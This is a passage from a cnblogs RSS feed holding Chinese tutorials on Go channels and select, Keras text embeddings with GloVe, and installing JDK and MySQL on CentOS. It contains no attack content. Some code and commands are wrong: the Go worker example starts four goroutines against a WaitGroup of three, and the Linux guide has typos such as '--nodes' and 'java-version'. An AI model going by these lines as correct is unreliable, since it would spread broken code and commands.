    &quot;math/rand&quot;
    &quot;sync&quot;
)

var wg sync.WaitGroup

func main() {
    wg.Add(3)
    // 创建两个channel
    ch1 := make(chan int)
    ch2 := make(chan int)

    // 3个goroutine并行
    go getRandNum(ch1)
    go addRandNum(ch1, ch2)
    go printRes(ch2)

    wg.Wait()
}

func getRandNum(out chan int) {
    // defer the wg.Done()
    defer wg.Done()

    var random int
    // 总共生成10个随机数
    for i := 0; i &amp;lt; 10; i++ {
        // 生成[0,30)之间的随机整数并放进channel out
        random = rand.Intn(30)
        out &amp;lt;- random
    }
    close(out)
}

func addRandNum(in,out chan int) {
    defer wg.Done()
    for v := range in {
        // 输出从第一个channel中读取到的数据
        // 并将值+1后放进第二个channel中
        fmt.Println(&quot;before +1:&quot;,v)
        out &amp;lt;- (v + 1)
    }
    close(out)
}

func printRes(in chan int){
    defer wg.Done()
    for v := range in {
        fmt.Println(&quot;after +1:&quot;,v)
    }
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;指定channel的方向&quot;&gt;指定channel的方向&lt;/h2&gt;
&lt;p&gt;上面通过两个channel将3个goroutine连接起来，其中起连接作用的是第二个函数addRandNum()。在这个函数中使用了两个channel作为参数：一个channel用于接收、一个channel用于发送。&lt;/p&gt;
&lt;p&gt;其实channel类的参数变量可以指定数据流向：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;in &amp;lt;-chan int&lt;/code&gt;：表示channel in通道只用于接收数据&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;out chan&amp;lt;- int&lt;/code&gt;：表示channel out通道只用于发送数据&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/733013/201811/733013-20181119183702016-988051316.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;只用于接收数据的通道&lt;code&gt;&amp;lt;-chan&lt;/code&gt;不可被关闭，因为关闭通道是针对发送数据而言的，表示无数据再需发送。对于recv来说，关闭通道是没有意义的。&lt;/p&gt;
&lt;p&gt;所以，上面示例中三个函数可改写为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;func getRandNum(out chan&amp;lt;- int) {
    ...
}

func addRandNum(in &amp;lt;-chan int, out chan&amp;lt;- int) {
    ...
}

func printRes(in &amp;lt;-chan int){
    ...
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;buffered-channel异步队列请求示例&quot;&gt;buffered channel异步队列请求示例&lt;/h2&gt;
&lt;p&gt;下面是使用buffered channel实现异步处理请求的示例。&lt;/p&gt;
&lt;p&gt;在此示例中：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;有(最多)3个worker，每个worker是一个goroutine，它们有worker ID。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;每个worker都从一个buffered channel中取出待执行的任务，每个任务是一个struct结构，包含了任务id(JobID)，当前任务的队列号(ID)以及任务的状态(worker是否执行完成该任务)。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;在main goroutine中将每个任务struct发送到buffered channel中，这个buffered channel的容量为10，也就是最多只允许10个任务进行排队。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;worker每次取出任务后，输出任务号，然后执行任务(run)，最后输出任务id已完成。&lt;/li&gt;
&lt;li&gt;每个worker执行任务的方式很简单：随机睡眠0-1秒钟，并将任务标记为完成。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;以下是代码部分：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
    &quot;math/rand&quot;
    &quot;sync&quot;
    &quot;time&quot;
)

type Task struct {
    ID         int
    JobID      int
    Status     string
    CreateTime time.Time
}

func (t *Task) run() {
    sleep := rand.Intn(1000)
    time.Sleep(time.Duration(sleep) * time.Millisecond)
    t.Status = &quot;Completed&quot;
}

var wg sync.WaitGroup

// worker的数量，即使用多少goroutine执行任务
const workerNum = 3

func main() {
    wg.Add(workerNum)

    // 创建容量为10的buffered channel
    taskQueue := make(chan *Task, 10)

    // 激活goroutine，执行任务
    for workID := 0; workID &amp;lt;= workerNum; workID++ {
        go worker(taskQueue, workID)
    }
    // 将待执行任务放进buffered channel，共15个任务
    for i := 1; i &amp;lt;= 15; i++ {
        taskQueue &amp;lt;- &amp;amp;Task{
            ID:         i,
            JobID:      100 + i,
            CreateTime: time.Now(),
        }
    }
    close(taskQueue)
    wg.Wait()
}

// 从buffered channel中读取任务，并执行任务
func worker(in &amp;lt;-chan *Task, workID int) {
    defer wg.Done()
    for v := range in {
        fmt.Printf(&quot;Worker%d: recv a request: TaskID:%d, JobID:%d\n&quot;, workID, v.ID, v.JobID)
        v.run()
        fmt.Printf(&quot;Worker%d: Completed for TaskID:%d, JobID:%d\n&quot;, workID, v.ID, v.JobID)
    }
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;select多路监听&quot;&gt;select多路监听&lt;/h2&gt;
&lt;p&gt;很多时候想要同时操作多个channel，比如从ch1、ch2读数据。Go提供了一个select语句块，它像switch一样工作，里面放一些case语句块，用来轮询每个case语句块的send或recv情况。&lt;/p&gt;
&lt;p&gt;select&lt;/p&gt;
&lt;p&gt;用法格式示例：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;select {
    // ch1有数据时，读取到v1变量中
    case v1 := &amp;lt;-ch1:
        ...
    // ch2有数据时，读取到v2变量中
    case v2 := &amp;lt;-ch2:
        ...
    // 所有case都不满足条件时，执行default
    default:
        ...
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;defalut语句是可选的，不允许fall through行为，但允许case语句块为空块。select会被return、break关键字中断。&lt;/p&gt;
&lt;p&gt;select的行为模式主要是对channel是否可读进行轮询，但也可以用来向channel发送数据。它的行为如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果所有的case语句块都被阻塞，则阻塞直到某个语句块可以被处理&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;如果多个case同时满足条件，则&lt;strong&gt;随机选择&lt;/strong&gt;一个进行处理&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;如果存在default且其它case都不满足条件，则执行default。所以default必须要可执行而不能阻塞&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;需要注意的是，&lt;strong&gt;如果在select中执行send操作，则可能会永远被send阻塞。所以，在使用send的时候，应该也使用defalut语句块，保证send不会被阻塞&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;一般来说，select会放在一个无限循环语句中，一直轮询channel的可读事件。&lt;/p&gt;
&lt;p&gt;下面是一个示例，pump1()和pump2()都用于产生数据(一个产生偶数，一个产生奇数)，并将数据分别放进ch1和ch2两个通道，suck()则从ch1和ch2中读取数据。然后在无限循环中使用select轮询这两个通道是否可读，最后main goroutine在1秒后强制中断所有goroutine。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
    &quot;time&quot;
)

func main() {
    ch1 := make(chan int)
    ch2 := make(chan int)
    go pump1(ch1)
    go pump2(ch2)
    go suck(ch1, ch2)
    time.Sleep(1e9)
}
func pump1(ch chan int) {
    for i := 0; i &amp;lt;= 30; i++ {
        if i%2 == 0 {
            ch &amp;lt;- i
        }
    }
}
func pump2(ch chan int) {
    for i := 0; i &amp;lt;= 30; i++ {
        if i%2 == 1 {
            ch &amp;lt;- i
        }
    }
}
func suck(ch1 chan int, ch2 chan int) {
    for {
        select {
        case v := &amp;lt;-ch1:
            fmt.Printf(&quot;Recv on ch1: %d\n&quot;, v)
        case v := &amp;lt;-ch2:
            fmt.Printf(&quot;Recv on ch2: %d\n&quot;, v)
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Mon, 19 Nov 2018 14:50:00 +0000</pubDate>
<dc:creator>骏马金龙</dc:creator>
<og:description>channel基础 channel用于goroutines之间的通信，让它们之间可以进行数据交换。像管道一样，一个goroutine_A向channel_A中放数据，另一个goroutine_B从ch</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/f-ck-need-u/p/9986335.html</dc:identifier>
</item>
<item>
<title>python Deep learning 学习笔记（5） - 范中豪</title>
<link>http://www.cnblogs.com/zhhfan/p/9985991.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhhfan/p/9985991.html</guid>
<description>&lt;p&gt;&lt;strong&gt;本节讲深度学习用于文本和序列&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用于处理序列的两种基本的深度学习算法分别是循环神经网络（recurrent neural network）和一维卷积神经网络（1D convnet）&lt;br/&gt;与其他所有神经网络一样，深度学习模型不会接收原始文本作为输入，它只能处理数值张量。&lt;strong&gt;文本向量化（vectorize）&lt;/strong&gt;是指将文本转换为数值张量的过程。它有多种实现方法&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;将文本分割为单词，并将每个单词转换为一个向量&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;将文本分割为字符，并将每个字符转换为一个向量&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;提取单词或字符的 n-gram，并将每个 n-gram 转换为一个向量。n-gram 是多个连续单词或字符的集合（n-gram 之间可重叠）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;将文本分解而成的单元（单词、字符或 n-gram）叫作&lt;strong&gt;标记（token）&lt;/strong&gt;，将文本分解成标记的过程叫作&lt;strong&gt;分词（tokenization）&lt;/strong&gt;。所有文本向量化过程都是应用某种分词方案，然后将数值向量与生成的标记相关联。这些向量组合成序列张量，被输入到深度神经网络中&lt;/p&gt;
&lt;blockquote readability=&quot;32&quot;&gt;
&lt;p&gt;n-gram 是从一个句子中提取的 N 个（或更少）连续单词的集合。这一概念中的“单词”也可以替换为“字符”&lt;br/&gt;The cat sat on the mat 分解为二元语法(2-gram)的集合&lt;br/&gt;{&quot;The&quot;, &quot;The cat&quot;, &quot;cat&quot;, &quot;cat sat&quot;, &quot;sat&quot;, &quot;sat on&quot;, &quot;on&quot;, &quot;on the&quot;, &quot;the&quot;, &quot;the mat&quot;, &quot;mat&quot;}&lt;br/&gt;分解为三元语法(3-gram)的集合&lt;br/&gt;{&quot;The&quot;, &quot;The cat&quot;, &quot;cat&quot;, &quot;cat sat&quot;, &quot;The cat sat&quot;,&lt;br/&gt;&quot;sat&quot;, &quot;sat on&quot;, &quot;on&quot;, &quot;cat sat on&quot;, &quot;on the&quot;, &quot;the&quot;,&lt;br/&gt;&quot;sat on the&quot;, &quot;the mat&quot;, &quot;mat&quot;, &quot;on the mat&quot;}&lt;br/&gt;这样的集合分别叫作&lt;strong&gt;二元语法袋（bag-of-2-grams）&lt;/strong&gt;及&lt;strong&gt;三元语法袋&lt;/strong&gt;（bag-of-3-grams）。这里&lt;strong&gt;袋&lt;/strong&gt;（bag）这一术语指的是，我们处理的是标记组成的集合。这一系列分词方法叫作&lt;strong&gt;词袋&lt;/strong&gt;（bag-of-words）。词袋是一种不保存顺序的分词方法，因此它往往被用于浅层的语言处理模型，而不是深度学习模型&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1503464/201811/1503464-20181119214247189-1071664192.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;将向量与标记相关联的方法&lt;/em&gt;&lt;/strong&gt;&lt;br/&gt;对标记做 &lt;strong&gt;one-hot 编码（one-hot encoding）&lt;/strong&gt;与&lt;strong&gt;标记嵌入&lt;/strong&gt;［token embedding，通常只用于单词，叫作&lt;strong&gt;词嵌入&lt;/strong&gt;（word embedding）］&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;one-hot 编码&lt;/strong&gt;是将标记转换为向量的最常用、最基本的方法&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;它将每个单词与一个唯一的整数索引相关联，然后将这个整数索引 i 转换为长度为 N 的二进制向量（N 是词表大小），这个向量只有第 i 个元素是 1，其余元素都为 0 (也可以进行字符级的 one-hot 编码)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Keras one-hot编码Demo&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;from keras.preprocessing.text import Tokenizer


samples = ['The cat sat on the mat.', 'The dog ate my homework.']
# 只考虑前1000个最常见的单词
tokenizer = Tokenizer(num_words=1000)
# 构建单词索引
tokenizer.fit_on_texts(samples)
# 找回单词索引
word_index = tokenizer.word_index
print(word_index)
# 将字符串转换为整数索引组成的列表
sequences = tokenizer.texts_to_sequences(samples)
print(&quot;转换成的索引序列 &quot;, sequences)
text = tokenizer.sequences_to_texts(sequences)
print(&quot;转会的文本 &quot;, text)
# 得到 one-hot 二进制表示
one_hot_results = tokenizer.texts_to_matrix(samples, mode='binary')
one_num = 0
for items in one_hot_results:
    for item in items:
        if item == 1:
            one_num += 1
print(&quot;1的数量为 &quot;, one_num)
print(one_hot_results)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1503464/201811/1503464-20181119214313923-1772426995.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;one-hot 编码的一种变体是所谓的 &lt;strong&gt;one-hot 散列技巧&lt;/strong&gt;（one-hot hashing trick），如果词表中唯&lt;br/&gt;一标记的数量太大而无法直接处理，就可以使用这种技巧&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;将单词散列编码为固定长度的向量，通常用一个非常简单的散列函数来实现&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这种方法的主要优点在于，它避免了维护一个显式的单词索引，从而节省内存并允许数据的在线编码，缺点就是可能会出现散列冲突&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;词嵌入&lt;/strong&gt;&lt;br/&gt;one-hot 编码得到的向量是二进制的、稀疏的、维度很高的（维度大小等于词表中的单词个数），而词嵌入是低维的浮点数向量。与 one-hot 编码得到的词向量不同，词嵌入是从数据中学习得到的。常见的词向量维度是 256、512 或 1024（处理非常大的词表时）。与此相对，onehot 编码的词向量维度通常为 20 000 或更高。因此，词向量可以将更多的信息塞入更低的维度中&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1503464/201811/1503464-20181119214356681-642757640.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;获取词嵌入有两种方法&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在完成主任务（比如文档分类或情感预测）的同时学习词嵌入。在这种情况下，一开始是随机的词向量，然后对这些词向量进行学习，其学习方式与学习神经网络的权重相同&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;在不同于待解决问题的机器学习任务上预计算好词嵌入，然后将其加载到模型中。这些词嵌入叫作&lt;strong&gt;预训练词嵌入&lt;/strong&gt;（pretrained word embedding）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;利用 Embedding 层学习词嵌入&lt;/em&gt;&lt;/strong&gt;&lt;br/&gt;词嵌入的作用应该是将人类的语言映射到几何空间中，我们希望任意两个词向量之间的几何距离）应该和这两个词的语义距离有关。可能还希望嵌入空间中的特定方向也是有意义的&lt;br/&gt;Embedding 层的输入是一个二维整数张量，其形状为 (samples, sequence_length)，它能够嵌入长度可变的序列，不过一批数据中的所有序列必须具有相同的长度&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;简单Demo&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;from keras.datasets import imdb
from keras import preprocessing
from keras.models import Sequential
from keras.layers import Flatten, Dense, Embedding
import matplotlib.pyplot as plt


max_features = 10000
maxlen = 20
(x_train, y_train), (x_test, y_test) = imdb.load_data(num_words=max_features, path='E:\\study\\dataset\\imdb.npz')
x_train = preprocessing.sequence.pad_sequences(x_train, maxlen=maxlen)
x_test = preprocessing.sequence.pad_sequences(x_test, maxlen=maxlen)
model = Sequential()
model.add(Embedding(10000, 8, input_length=maxlen))
model.add(Flatten())
model.add(Dense(1, activation='sigmoid'))
model.compile(optimizer='rmsprop', loss='binary_crossentropy', metrics=['acc'])
model.summary()
history = model.fit(x_train, y_train, epochs=10, batch_size=32, validation_split=0.2)


acc = history.history['acc']
val_acc = history.history['val_acc']
loss = history.history['loss']
val_loss = history.history['val_loss']
epochs = range(1, len(acc) + 1)
plt.plot(epochs, acc, 'bo', label='Training acc')
plt.plot(epochs, val_acc, 'b', label='Validation acc')
plt.title('Training and validation accuracy')
plt.legend()
plt.figure()
plt.plot(epochs, loss, 'bo', label='Training loss')
plt.plot(epochs, val_loss, 'b', label='Validation loss')
plt.title('Training and validation loss')
plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1503464/201811/1503464-20181119214453498-1554948539.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1503464/201811/1503464-20181119214503948-1025686681.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当可用的训练数据很少，以至于只用手头数据无法学习适合特定任务的词嵌入，你可以从预计算的嵌入空间中加载嵌入向量，而不是在解决问题的同时学习词嵌入。有许多预计算的词嵌入数据库，你都可以下载并在 Keras 的 Embedding 层中使用，&lt;strong&gt;word2vec&lt;/strong&gt; 就是其中之一。另一个常用的是 &lt;strong&gt;&lt;a href=&quot;http://nlp.stanford.edu/data/glove.6B.zip&quot;&gt;GloVe&lt;/a&gt;&lt;/strong&gt;（global vectors for word representation，词表示全局向量）&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;没有足够的数据来自己学习真正强大的特征，但你需要的特征应该是非常通用的，比如常见的视觉特征或语义特征&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;新闻情感分类Demo，使用GloVe预训练词&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;import os
from keras.preprocessing.text import Tokenizer
from keras.preprocessing.sequence import pad_sequences
import numpy as np
from keras.models import Sequential
from keras.layers import Embedding, Flatten, Dense
import matplotlib.pyplot as plt


imdb_dir = 'E:\\study\\dataset\\aclImdb'
train_dir = os.path.join(imdb_dir, 'train')
labels = []
texts = []
for label_type in ['neg', 'pos']:
    dir_name = os.path.join(train_dir, label_type)
    for fname in os.listdir(dir_name):
        if fname[-4:] == '.txt':
            f = open(os.path.join(dir_name, fname))
            texts.append(f.read())
            f.close()
            if label_type == 'neg':
                labels.append(0)
            else:
                labels.append(1)
# 对 IMDB 原始数据的文本进行分词
maxlen = 100
training_samples = 200
validation_samples = 10000
max_words = 10000
tokenizer = Tokenizer(num_words=max_words)
tokenizer.fit_on_texts(texts)
sequences = tokenizer.texts_to_sequences(texts)
word_index = tokenizer.word_index

data = pad_sequences(sequences, maxlen=maxlen)
labels = np.asarray(labels)
print('Shape of data tensor:', data.shape)
print('Shape of label tensor:', labels.shape)
# 打乱数据
indices = np.arange(data.shape[0])
np.random.shuffle(indices)
data = data[indices]
labels = labels[indices]

x_train = data[:training_samples]
y_train = labels[:training_samples]
x_val = data[training_samples: training_samples + validation_samples]
y_val = labels[training_samples: training_samples + validation_samples]

# 　解析 GloVe 词嵌入文件
glove_dir = 'E:\\study\\models\\glove.6B'

embeddings_index = {}
f = open(os.path.join(glove_dir, 'glove.6B.100d.txt'))
for line in f:
    values = line.split()
    word = values[0]
    coefs = np.asarray(values[1:], dtype='float32')
    embeddings_index[word] = coefs
f.close()
print('Found %s word vectors.' % len(embeddings_index))

# 准备 GloVe 词嵌入矩阵(max_words, embedding_dim)
embedding_dim = 100
embedding_matrix = np.zeros((max_words, embedding_dim))
for word, i in word_index.items():
    if i &amp;lt; max_words:
        embedding_vector = embeddings_index.get(word)
        if embedding_vector is not None:
            embedding_matrix[i] = embedding_vector

# 　模型定义
model = Sequential()
model.add(Embedding(max_words, embedding_dim, input_length=maxlen))
model.add(Flatten())
model.add(Dense(32, activation='relu'))
model.add(Dense(1, activation='sigmoid'))
model.summary()
# 将预训练的词嵌入加载到 Embedding 层中，并冻结
model.layers[0].set_weights([embedding_matrix])
model.layers[0].trainable = False
# 训练与评估
model.compile(optimizer='rmsprop', loss='binary_crossentropy', metrics=['acc'])
history = model.fit(x_train, y_train, epochs=10, batch_size=32, validation_data=(x_val, y_val))
model.save_weights('pre_trained_glove_model.h5')

acc = history.history['acc']
val_acc = history.history['val_acc']
loss = history.history['loss']
val_loss = history.history['val_loss']
epochs = range(1, len(acc) + 1)
plt.plot(epochs, acc, 'bo', label='Training acc')
plt.plot(epochs, val_acc, 'b', label='Validation acc')
plt.title('Training and validation accuracy')
plt.legend()
plt.figure()
plt.plot(epochs, loss, 'bo', label='Training loss')
plt.plot(epochs, val_loss, 'b', label='Validation loss')
plt.title('Training and validation loss')
plt.legend()
plt.show()

# 对测试集数据进行分词
test_dir = os.path.join(imdb_dir, 'test')
labels = []
texts = []
for label_type in ['neg', 'pos']:
    dir_name = os.path.join(test_dir, label_type)
    for fname in sorted(os.listdir(dir_name)):
        if fname[-4:] == '.txt':
            f = open(os.path.join(dir_name, fname))
            texts.append(f.read())
            f.close()
            if label_type == 'neg':
                labels.append(0)
            else:
                labels.append(1)
sequences = tokenizer.texts_to_sequences(texts)
x_test = pad_sequences(sequences, maxlen=maxlen)
y_test = np.asarray(labels)
# 在测试集上评估模型
model.load_weights('pre_trained_glove_model.h5')
model.evaluate(x_test, y_test)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;数据下的时间太长放弃了，233&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/zhhfan/p/9978099.html&quot;&gt;python Deep learning 学习笔记（4）&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 19 Nov 2018 13:50:00 +0000</pubDate>
<dc:creator>范中豪</dc:creator>
<og:description>深度学习用于文本和序列</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhhfan/p/9985991.html</dc:identifier>
</item>
<item>
<title>Linux下安装JDK，Tomcat，Mysql详细教程 - 经典鸡翅</title>
<link>http://www.cnblogs.com/jichi/p/9985988.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jichi/p/9985988.html</guid>
<description>&lt;h2 id=&quot;概述&quot;&gt;1. 概述&lt;/h2&gt;
&lt;p&gt;今天教大家在linux下安装jdk，mysql以及tomcat。在javaweb开发中，最后完成的项目代码，一般都是布在linux服务器下的。因为linux服务器可以说是安全性稳定性都比windows高。所以说学会并能够布置一套环境是十分重要的，大多数开发中多选用tomcat作为服务器，jdk是必须安装的，数据库有的项目用mysql，有的用oracle。本次以mysql为例。&lt;/p&gt;
&lt;h2 id=&quot;概述&quot;&gt;2. Linux下jdk的安装&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;安装步骤：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1）&lt;span&gt;查看当前&lt;/span&gt;Linux系统是否已经安装java&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
rpm -qa | grep java
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1534147/201811/1534147-20181119212608744-1411474297.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2）&lt;span&gt;卸载两个&lt;/span&gt;openJDK&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
rpm -e --nodeps 要卸载的软件
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;效果如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1534147/201811/1534147-20181119212635755-1601475462.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3）通过远程工具XShell或sshsecure&lt;span&gt;上传&lt;/span&gt;jdk到linux&lt;/p&gt;
&lt;p&gt;4）&lt;span&gt;解压&lt;/span&gt;jdk到/usr/local下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
tar –xvf jdk-7u71-linux-i586.tar.gz –C /usr/local
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;5）&lt;span&gt;配置&lt;/span&gt;jdk环境变量，打开/etc/profile配置文件&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
vim /etc/profile
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;将下面配置拷贝进去&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#set java environment

JAVA_HOME&lt;/span&gt;=/usr/local/jdk1.7&lt;span&gt;.0_71

CLASSPATH&lt;/span&gt;=.:$JAVA_HOME/&lt;span&gt;lib.tools.jar

PATH&lt;/span&gt;=$JAVA_HOME/&lt;span&gt;bin:$PATH

export JAVA_HOME CLASSPATH PATH &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;7）&lt;span&gt;重新加载&lt;/span&gt;/etc/profile&lt;span&gt;配置文件&lt;/span&gt; &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
source /etc/profile
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;8）&lt;span&gt;输入&lt;/span&gt;java-version进行测试。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
java-version 
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;概述&quot;&gt;3. Linux下mysql的安装&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;安装步骤：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1）&lt;span&gt;查看&lt;/span&gt;CentOS自带的mysql&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
rpm -qa | grep mysql
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1534147/201811/1534147-20181119213425368-1328061156.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2）&lt;span&gt;将自带的&lt;/span&gt;mysql卸载&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
rpm -e --nodes mysql-libs-5.1.73-5.e16_6.i686
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1534147/201811/1534147-20181119213605556-929264785.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3）&lt;span&gt;上传&lt;/span&gt;Mysql到linux&lt;/p&gt;
&lt;p&gt;4）&lt;span&gt;解压&lt;/span&gt;Mysql到/usr/local/下的mysql目录(mysql目录需要手动创建)内&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; cd /usr/&lt;span&gt;local
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;mkdir mysql
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; tar -xvf MySQL-5.6.22-1.el6.i686.rpm-bundle.tar -C /usr/local/mysql
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;5）&lt;span&gt;在&lt;/span&gt;/usr/local/mysql下安装mysql&lt;/p&gt;
&lt;p&gt;安装服务器端：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
rpm -ivh MySQL-server-5.6.22-1.el6.i686.rpm
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;安装客户端：&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
rpm -ivh MySQL-client-5.6.22-1.el6.i686.rpm
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;6）&lt;span&gt;启动&lt;/span&gt;mysql&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
service mysql start
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;7）&lt;span&gt;将&lt;/span&gt;mysql加到系统服务中并设置开机启动&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
加入到系统服务：chkconfig --&lt;span&gt;add mysql
自动启动：chkconfig mysql on&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;8）&lt;span&gt;登录&lt;/span&gt;mysql&lt;/p&gt;
&lt;p&gt;mysql安装好后会生成一个临时随机密码，存储位置在/root/.mysql_secret&lt;/p&gt;
&lt;p&gt;msyql –u root -p&lt;/p&gt;
&lt;p&gt;如下图所示，会对你进行提示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1534147/201811/1534147-20181119213952991-767215961.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;9）找到位置后，会得到一个随机密码，用随机密码进行登陆之后，不能进行任何数据库操作，会提示你进行修改mysql密码。&lt;/p&gt;
&lt;p&gt;10）&lt;span&gt;修改&lt;/span&gt;mysql的密码&lt;/p&gt;
